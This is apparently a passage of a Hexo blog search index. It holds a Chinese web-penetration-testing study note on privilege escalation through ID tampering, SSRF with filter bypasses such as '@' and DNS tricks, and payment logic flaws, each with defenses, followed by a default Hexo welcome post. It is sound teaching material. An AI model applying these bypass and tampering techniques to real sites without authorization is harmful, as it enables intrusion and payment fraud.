href="https://www.uedbox.com/post/42136" target="_blank" rel="noopener">https://www.uedbox.com/post/42136</a></p><br><p>在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面。</p><p>密保问题可能容易直接被猜解（比如很多学校的知道学号和身份证号码就可以重置校园通的密码）</p><p>密保问题答案页面中显示（数据包里面可能自带了密保答案，可能在JS里面</p><h2 id="越权——通过修改参数获取管理员权限"><a href="#越权——通过修改参数获取管理员权限" class="headerlink" title="越权——通过修改参数获取管理员权限"></a>越权——通过修改参数获取管理员权限</h2><p>越权访问：这类漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账号后，可以利用一些方法绕故宫权限检测，访问或者操作原本无权访问的高权限功能。在实际的代码安全审查中，这类漏洞往往很难通过工具进行自动化检测，因此在实际应用中危害很大。其与未授权访问有一定差别。目前存在这两种操作类型：水平越权和垂直越权操作。</p><p>水平越权：是指相同权限下不同的用户可以互相访问；</p><p>垂直越权：是指使用权限低的用户可以访问到权限较高的用户水平越权测试方法主要就是看看能够通过A用户操作影响到B用户；</p><p>垂直越权的测试四楼就是低权限用户使用高权限用户的功能，比如普通用户可使用管理员功能。</p><p>还有一种交叉越权：A用户既能修改掉B用户的密码，也能修改掉管理员的密码</p><h3 id="越权测试过程"><a href="#越权测试过程" class="headerlink" title="越权测试过程"></a>越权测试过程</h3><p>越权测试</p><p>登录A用户时，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试。（如果可以影响到高权限用户就是垂直越权）</p><p>传参ID参数需要自己检测（常见：uid= id= user=等）通常使用burp进行爆破传参（传承可能在GET、POST、COOKIE）</p><p>常见平行越权（不需要输入原密码的修改密码，抓包该用户名或者用户id修改他人密码；修改资料的时候修改用户id；查看订单的时候，遍历订单id等）</p><br><p>还有一种叫做未授权访问，严格意义上而言这个不属于越权漏洞，但是在日常测试中常常会遇到（只要输入正确的网址就可以直接访问，例如：/admin默认是登录，登录后跳转到了user.php，然后你直接访问user.php，发现你直接有后台权限）</p><p>可以通过目录爆破来得到页面地址</p><h2 id="SSRF——服务器端请求伪造"><a href="#SSRF——服务器端请求伪造" class="headerlink" title="SSRF——服务器端请求伪造"></a>SSRF——服务器端请求伪造</h2><p>SSRF就是你可以控制目标站点去访问其他网站</p><p>有一种经典的环境就是在线翻译，那么翻译是怎么翻译的呢？</p><p>①、获取你访问的页面，然后翻译；</p><p>②、翻译网站的服务器去访问页面，然后翻译给你。</p><p>访问ip.cn查看自己的公网IP，对照翻译网站访问的ip.cn查看的ip，如果不一样则为②，但是这样的网站不一定存在SSRF</p><h3 id="SSRF划分界限："><a href="#SSRF划分界限：" class="headerlink" title="SSRF划分界限："></a>SSRF划分界限：</h3><p>第一种说法：</p><p>​    只要能发起网络请求就是存在漏洞，因为有风险。例：假如我们找有道翻译，然后攻击政府网站，那有道就成了我们的跳板；</p><p>第二种说法：</p><p>​    只有访问到内网和本机才算存在SSRF，因为第一种说法是不可避免的</p><p>为什么访问到本机和内网才有严重危害呢？正是因为外紧内松的原因；</p><p>本机比内网更加脆弱，本机就是自己的电脑，自己访问自救属于很正常的操作</p><h3 id="SSRF能做什么？"><a href="#SSRF能做什么？" class="headerlink" title="SSRF能做什么？"></a>SSRF能做什么？</h3><p>扫描内部网络；</p><p>向内部任意主机的任意端口发送精心构造的包；</p><p>DOS（请求大文件，始终保持连接keep-Aline Always）；</p><p>暴力穷举（users/dirs/Files）。</p><p>很多站点和防护软件，对127.0.0.1的本地访问并不会拦截，当你有网站管理员权限的时候，某些站点的自带防护也不会拦截</p><p><strong>信息安全的本质——信任问题</strong></p><p>第一种危害：我们可以通过过http访问到一些未开发完的网站</p><p>第二种危害：SSRF不只有支持HTTP协议，通过file协议可以获取到php的源码，能够读取是很有用的，去读一些配置文件很有可能得到数据库的账号密码，不只有file协议，还有很多其他的协议也支持；dict协议（字典协议）：查询开放的端口</p><h3 id="怎么寻找SSRF"><a href="#怎么寻找SSRF" class="headerlink" title="怎么寻找SSRF"></a>怎么寻找SSRF</h3><p>1、看功能（出现外部访问，如：翻译）</p><p>2、看传参，如果该说传参中存在有后缀的东西，例：?url=<a href="http://127.0.0.1/1.php?urs=2.php" target="_blank" rel="noopener">http://127.0.0.1/1.php?urs=2.php</a></p><p>有传参可能有：</p><p>①、读取文件显示给你；</p><p>②、包含文件（文件包含）；</p><p>③、下载文件</p><p>或者传参中有协议名，如：http://</p><h3 id="防护SSRF"><a href="#防护SSRF" class="headerlink" title="防护SSRF"></a>防护SSRF</h3><p>例：通过正则匹配，不允许你穿内网地址；127.0.0.1=&gt;拦截访问</p><p>怎么绕过正则？</p><p>1、域名肯定是要解析成IP，我们自己申请一个域名，把地址指向127.0.0.1，dnslog.cn这个平台的域名可以解决这个问题，它上面的域名都是访问到本机的</p><p>子域名有一种情况叫做泛解析：当这个域名没有特殊规定的时候，自动解析到某个ip</p><p>2、通过@</p><p>例：?url=<a href="http://http://baidu.com@127.0.0.1/1.php，当被检测不能用http://127.0.0.1时就用@，baidu.com" target="_blank" rel="noopener">http://http://baidu.com@127.0.0.1/1.php，当被检测不能用http://127.0.0.1时就用@，baidu.com</a> 相当于一个名字</p><h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><h3 id="1、快捷支付原理"><a href="#1、快捷支付原理" class="headerlink" title="1、快捷支付原理"></a>1、快捷支付原理</h3><p>我们在网购平台买东西，花了钱，平台肯定要知道你付了钱，双湖网站接入支付结果有两种方法</p><p>​    ①、浏览器跳转（基本遇不到）</p><p>​                基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全度。</p><p>​    ②、服务器端异步通知</p><p>​                该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接受异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或者为用户进行网站内入账等。</p><p>支付漏洞属于逻辑漏洞，不需要代码审计</p><h3 id="常见支付漏洞"><a href="#常见支付漏洞" class="headerlink" title="常见支付漏洞"></a>常见支付漏洞</h3><ul><li>修改支付的价格；</li><li>修改支付的状态；</li><li>修改订单数量；</li><li>修改附加值；</li><li>越权支付；</li><li>无限制试用。</li></ul><h3 id="2、如何挖掘支付漏洞"><a href="#2、如何挖掘支付漏洞" class="headerlink" title="2、如何挖掘支付漏洞"></a>2、如何挖掘支付漏洞</h3><ul><li><p>找到关键的数据包</p><p>可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p></li><li><p>分析数据包</p><p>支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p></li><li><p>不按套路出牌<br>多去想想开发者没有想到的地方</p></li><li><p>pc端尝试过，wap端也看看，app也试试</p></li></ul><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>后端检测每一项值，包括支付状态；</li><li>效验价格、数量参数，比如产品数量只能为正整数，并限制购买数量；</li><li>与第三方支付平台检查，实际支付的金额是否与订单金额一致；</li><li>支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题；</li><li>金额查过阈值，进行人工审核。</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/07/24/hello-word/"/>
      <url>/2020/07/24/hello-word/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
